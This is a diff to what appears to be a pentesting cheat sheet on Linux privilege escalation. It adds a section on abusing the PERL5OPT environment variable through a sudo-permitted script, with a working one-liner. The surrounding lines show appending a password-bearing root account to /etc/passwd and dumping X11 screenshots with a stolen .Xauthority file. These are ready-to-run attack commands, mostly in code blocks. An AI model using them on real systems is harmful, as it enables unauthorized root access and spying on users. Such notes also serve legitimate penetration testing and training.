@@ -243,6 +243,17 @@ echo "root2:Ur0xZo454Kq1s:0:0:root:/root/:/bin/bash" >> /etc/passwd
 su root2 # passwd:evil
 ```
 
+## ENV Variables
+See https://www.elttam.com/blog/env/
+
+### Example with PERL ENV variables
+Assume the user may run a bash script called ``sudo /opt/monitor.sh``
+We can abuse the ENV variable "PERL5OPT":
+
+```bash
+sudo 'PERL5OPT=-Mbase;print(`id`)' /opt/monitor.sh
+```
+
 # Dump screenshot from X11 session
 Prerequisite: .Xauthority file from session
 1. define XAUTHORITY variable: ``export XAUTHORITY=/tmp/.Xauthority``
